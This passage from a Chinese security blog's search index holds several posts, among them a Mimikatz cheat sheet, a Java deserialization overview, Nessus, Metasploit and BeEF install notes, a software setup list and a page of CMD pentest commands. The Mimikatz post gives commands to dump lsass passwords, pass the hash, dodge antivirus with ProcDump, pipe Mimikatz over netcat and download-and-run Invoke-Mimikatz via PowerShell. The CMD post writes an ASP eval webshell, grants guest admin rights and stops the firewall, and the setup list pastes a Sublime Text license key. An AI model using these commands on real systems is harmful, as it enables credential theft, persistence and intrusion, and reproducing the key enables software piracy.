    <content type="text"><![CDATA[Mimikatz是一款能够从Windows认证进程(lsass.exe)里获取处于active状态账号明文密码的工具。在针对Windows操作系统的后渗透测试中经常用到 基本使用本地执行并输出结果1C:\&gt;mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit &amp;&amp; dir 将输出输入到文件将结果输出到log.txt文件中，这种输出结果便于查看 1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit &gt;&gt; log.txt 内网渗透使用NC远程执行本地监听任意端口 1C:\&gt;nc.exe -lvp 1234 远端使用NC执行1C:\&gt;nc.exe -vv you_ip 1234 -e mimikatz.exe Hash传递12Privilege::debugsekurlsa::pth /domain:xxxx /user:xxxxx /ntlm:xxxxxx 导出所有用户口令1lsadump::sam SYSTEM.hiv SAM.hiv 其他技巧配合ProcDump绕过杀软实际测试中Mimikatz通常会被杀软查杀，配合ProcDump可以抓取内存后本地解密。ProcDump是微软的一款工具，其主要目的是监视CPU峰值的应用程序，但同时它也可以用于进程转储。下载地址 工具使用： 1C:\&gt;procdump.exe -accepteula -ma lsass.exe passwd.dmp 进程保存好后下载到本地，这里要注意本地运行Mimikatz的系统要与目标机器的系统兼容，兼容性如下： 准备好环境后就可以用Mimikatz抓取密码了 123mimikatz # sekurlsa::minidump passwd.dmpSwitch to MINIDUMPmimikatz # sekurlsa::logonPasswords full 使用Powershell抓取密码Powershell是运行在Windows机器上实现系统和应用程序管理自动化的命令行脚本环境，支持.NET对象。白名单、可以轻松绕过杀软。 1powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"]]></content>
      <tags>
        <tag>Tips</tag>
        <tag>Mimikatz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化漏洞]]></title>
    <url>%2F2015%2F11%2F18%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[2015年11月6日，FoxGlove Security安全团队的@breenmachine发布的一篇博客[3]中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行 漏洞简介序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复的样例代码： 1234567891011121314151617public static void main(String args[]) throws Exception &#123; String obj = "hello world!"; // 将序列化对象写入文件object.db中 FileOutputStream fos = new FileOutputStream("object.db"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // 从文件object.db中读取数据 FileInputStream fis = new FileInputStream("object.db"); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象obj String obj2 = (String)ois.readObject(); ois.close();&#125; 问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行（摘自：长亭科技） 漏洞检测检测工具，可以对Jenkins、JBoss、WebLogic反序列化漏洞进行检测 漏洞修复JBoss 更新源代码,在JBoss源代码中打入最新的官方patch。启用防火墙,防护防火墙策略设置，限定可以连接到JBoss的IP安全验证配置,对外服务，需要在jmx-invoker-service.xml中开启权限验证JBoss服务专有用户权限，没有登录权限，达到权限最小化 WebLogic 首先停止weblogic服务，在中间件modules目录下找到名为com.bea.core.apache.commons.collections_x.x.x.jar文件然后下载最新的commons-collections(bin包)，用压缩包中的commons-collections-x.x.x.jar替换有漏洞的jar包jar包下载注意：jar包的文件名不要改然后启动weblogic。]]></content>
      <tags>
        <tag>Vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下离线更新Nessus插件]]></title>
    <url>%2F2015%2F08%2F18%2FLinux%E4%B8%8B%E7%A6%BB%E7%BA%BF%E6%9B%B4%E6%96%B0Nessus%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Nessus是目前全世界最多人使用的系统漏洞扫描与分析软件，总共有超过75000个机构使用Nessus作为扫描该机构电脑系统的软件。安装的时候网络不好，更新插件失败，记录下手动安装过程 获得Challenge Code先获取自己的Challenge Code 1sudo /opt/nessus/sbin/nessuscli fetch --challenge 会获取下列信息，保存好challenge code Challenge code: c619b40c78d630f88105b70def4a3393cbac07d8 获取激活码需要去官网重新获取一个激活码，地址https://www.tenable.com/products/nessus/activation-code 选择对应的版本，从邮箱中找到激活码并保存 下载插件包打开插件包下载地址，输入Challenge Code以及邮箱中的激活码，下载nessus.license和all-2.0.tar.gz两个文件 安装License找到刚下载的nessus.license文件 1sudo /opt/nessus/sbin/nessuscli update ~/pentest/tools/Nessus/nessus.license 会输出下列信息，提示注册成功 Your Activation Code has been registered properly – thank you. 安装插件将下载到本地的all-2.0.tar.gz解压并安装 1sudo /opt/nessus/sbin/nessuscli update all-2.0.tar.gz 重新启动重新启动Nessus服务完成插件更新 1sudo /etc/init.d/nessusd restart 再打开https://127.0.0.1:8834即可进行工作了]]></content>
      <tags>
        <tag>Vulnerability</tag>
        <tag>Nessus</tag>
        <tag>Scan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[源码安装Metasploit]]></title>
    <url>%2F2015%2F07%2F12%2F%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85Metasploit%2F</url>
    <content type="text"><![CDATA[Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。Metasploit是用Ruby脚本语言编写，具备跨平台性，这里记录在Ubuntu下通过源码编译安装过程。 准备环境下载源码从GitHub上克隆仓库到/opt/metasploit-framework/目录下 1git clone https://github.com/rapid7/metasploit-framework.git /opt/metasploit-framework/ 安装Ruby环境Metasploit是用Ruby编写的，运行也需要Ruby环境 123456curl -sSL https://rvm.io/mpapis.asc | gpg --import -curl -L https://get.rvm.io | bash -s stablesource /home/jeffzhang/.rvm/scripts/rvmcd /opt/metasploit-framework/rvm --install .ruby-versionecho "[[ -s '$HOME/.rvm/scripts/rvm' ]] &amp;&amp; . '$HOME/.rvm/scripts/rvm'" &gt;&gt; .zshrc 安装依赖1sudo apt install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev curl zlib1g-dev 编译安装配置数据库Metasploit官方用的是postgres数据库 12sudo -u postgres psqlALTER USER postgres WITH PASSWORD 'passwd'; //建立用户 配置Metasploit配置数据库名、账号及密码 1sudo vi /opt/metasploit-framework/config/database.yml 编译12cd /opt/metasploit-framework/gem install bundle &amp;&amp; bundle install 运行使用使用前需启动数据库，并初始化 123456sudo service postgresql restartcd /opt/metasploit-frameworksudo ./msfd initsudo ./msfconsoledb_statusdb_rebuild_cache]]></content>
      <tags>
        <tag>Metasploit</tag>
        <tag>Exploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[装机手册]]></title>
    <url>%2F2015%2F04%2F21%2F%E8%A3%85%E6%9C%BA%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[电脑重装系统比较频繁，记录一些装机要用到的一些软件，后期有时间折腾个脚本。 install windows fonts1234567sudo mkdir /usr/share/fonts/winfontssudo cp ~/WinFonts/* /usr/share/fonts/winfontscd /usr/share/fonts/winfontssudo chmod 744 *sudo mkfontscalesudo mkfontdirsudo fc-cache -f -v install jdk812345sudo add-apt-repository ppa:webupd8team/javasudo apt-get updatesudo apt-get install oracle-java8-installersudo update-java-alternatives -s java-8-oraclejava -version install docker1234567891011curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -sudo apt-key fingerprint 0EBFCD88sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) \ stable"sudo apt-get updatesudo apt-cache madison docker-cesudo apt install docker-cesudo groupadd dockersudo usermod -aG docker $USER install shadowsocks12sudo apt-get install python-pipsudo pip install shadowsocks install chrome12wget https://dl.google.com/linux/direct/google-chrome.debsudo gdebi google-chrome-stable_current_amd64.deb install vbox12wget http://download.virtualbox.org/virtualbox/5.1.4/virtualbox.debsudo gdebi xxx.deb install sogoupinyin12wget http://pinyin.sogou.com/linux/?r=pinyinsudo gdebi xxx.deb install WPS12345wget http://community.wps.cn/download/sudo gdebi xxx.debvi wps wpp etexport XMODIFIERS=”@im=fcitx”export QT_IM_MODULE=”fcitx” install node.js12345wget https://nodejs.org/dist/v4.5.0/node-v4.5.0-linux-x64.tar.xzxz -d node-v4.5.0-linux-x64.tar.xztar -xvf node-v4.5.0-linux-x64.tar -C /var/sudo ln -s /var/node-v4.5.0-linux-x64/bin/node /usr/local/bin/nodesudo ln -s /var/node-v4.5.0-linux-x64/bin/npm /usr/local/bin/npm install sublime text12wget https://download.sublimetext.com/sublime-text_build-3114_amd64.debsudo gdebi sublime-text_build-3114_amd64.deb —– BEGIN LICENSE —–eldonSingle User LicenseEA7E-1122628C0360740 20724B8A 30420C09 6D7E046F3F5D5FBB 17EF95DA 2BA7BB27 CCB1494727A316BE 8BCF4BC0 252FB8FF FD97DF71B11A1DA9 F7119CA0 31984BB9 7D71700C2C728BF8 B952E5F5 B941FF64 6D7979DAB8EB32F8 8D415F8E F16FE657 A35381CC290E2905 96E81236 63D2B06D E5F01A6984174B79 7C467714 641A9013 94CA7162—— END LICENSE —— install git1sudo apt-get install git install nmap1234git clone https://github.com/nmap/nmap.git /tmp/nmapcd /tmp/nmap./configuresudo make &amp; make install install wireshark1234567sudo apt-add-repository ppa:wireshark-dev/stablesudo apt-get updatesudo apt-get install wiresharksudo groupadd wiresharksudo chgrp wireshark /usr/bin/dumpcapsudo chmod 4755 /usr/bin/dumpcapsudo gpasswd -a $user wireshark install wine1234sudo add-apt-repository ppa:ubuntu-wine/ppasudo apt-get updatesudo apt-get install wine1.8winecfg]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CMD下渗透常用命令]]></title>
    <url>%2F2014%2F09%2F13%2FCMD%E4%B8%8B%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[大部分的渗透对象都是Linux，Windows遇到的很少，很多命令记不住，记录一些经常用到的CMD命令 启用Guest账户1net user guest /active:yes 禁用Guest账户1net user guest /active:no 添加管理员权限1net localgroup administrators guest /add 新建用户1net user usertest ReU12d%wT$@81Jqg8 /add 更改用户密码1net user usertest ReU12d%wT$@81Jqg8 查看用户123net user //查看默认用户net localgroup //查看用户组net localgroup Administrators //查看用户 写文件1echo "&lt;%eval request("passwd")%&gt;" &gt;&gt; c:\wwwroot\1.asp 查看文件1type c:\wwwroot\test.asp 查看远程桌面端口1reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v portnumber 关闭防火墙1net stop sharedaccess]]></content>
  </entry>
  <entry>
    <title><![CDATA[BeEF安装]]></title>
    <url>%2F2014%2F04%2F11%2FBeEF%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[BeEF是一款用于浏览器端的渗透测试工具，BeEF可以通过一段编制好的javascript控制目标主机的浏览器，通过XSS等漏洞获取信息，或权限提升。 配置环境BeEF也是用Ruby脚本语言编写，安装使用也是需要Ruby环境 安装环境配置Ruby环境，这里直接安装最新Ruby版本 12sudo apt-add-repository ppa:brightbox/ruby-ngsudo apt-get install ruby-dev 安装依赖BeEF运行需要SQLite 3.x等依赖包 1sudo apt-get install libsqlite3-dev sqlite3 sqlite3-doc build-essential software-properties-common 获取源码BeEF源码可以从官网或GitHub上获取 1git clone https://github.com/beefproject/beef.git 编译安装123cd beefsudo gem install bundlerbundle install 运行BeEF1./beef -x 参考链接官方安装手册 一键安装脚本 1curl -L https://raw.githubusercontent.com/beefproject/beef/a6a7536e/install-beef | bash -s stable]]></content>
      <tags>
        <tag>BeEF</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
</search>
